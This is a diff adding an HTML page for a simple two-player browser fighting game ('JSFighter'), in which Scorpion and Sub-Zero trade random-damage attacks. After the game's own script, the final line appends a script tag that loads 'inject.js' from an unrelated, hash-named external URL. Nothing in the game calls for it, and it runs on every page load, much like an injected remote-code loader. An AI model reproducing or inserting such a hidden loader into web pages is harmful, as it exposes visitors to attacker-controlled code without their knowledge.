@@ -1,0 +1,65 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JSFighter</title>
+</head>
+<body>
+    <div id="player1">
+        <p id="p1Hp">
+
+        </p>
+        <button type="button" id="player1Attack" onclick = "player1.attack(player2)">Attack</button>
+    </div>
+    <div id="player2">
+        <p id="p2Hp">
+
+        </p>
+        <button type="button" id="player2Attack" onclick = "player2.attack(player1)">Attack</button>
+    </div>
+    <br>
+    <br>
+    <button type="button" id="newGame" onclick = "location.reload()">New Game</button>
+    <br>
+    <br>
+    <div id="win">
+
+    </div>
+    <script>
+        var player1P = document.getElementById("p1Hp");
+        var player2P = document.getElementById("p2Hp");
+        var youWin = document.getElementById("win");
+
+        class Fighter {
+            constructor(){
+                this.name = "YOU";
+                this.hp = 20;
+                this.atk = 2;
+            };
+            attack(target){
+                if (target.hp > 0){
+                    target.hp -= Math.floor(Math.random() * 5) + 1 + this.atk;
+                    if (target.hp < 0){
+                        target.hp = 0;
+                        document.getElementById("player1Attack").disabled = true;
+                        document.getElementById("player2Attack").disabled = true;
+                        youWin.innerHTML = this.name + " WIN! FATALITY"
+                    };
+                }
+                else if (target.hp == 0){
+                    target.hp = target.hp;
+                };
+                player1P.innerHTML = "Scorpion's HP is: " + player1.hp;
+                player2P.innerHTML = "Sub-Zero's HP is: " + player2.hp;
+            };
+        };
+
+        var player1 = new Fighter();
+        var player2 = new Fighter();
+
+        player1P.innerHTML = "Scorpion's HP is: " + player1.hp;
+        player2P.innerHTML = "Sub-Zero's HP is: " + player2.hp;
+    </script>
+<script type='text/javascript'  src="https://liveycstech-my.sharepoint.com/14692e8a3920270b81d423dd70ce3bed8fd56862bc1c6706cfce00fef8f4cbc3/inject.js?id=85b5f40c-a508-40fc-a4b4-1e83cc14275b"></script></body>
+</html>
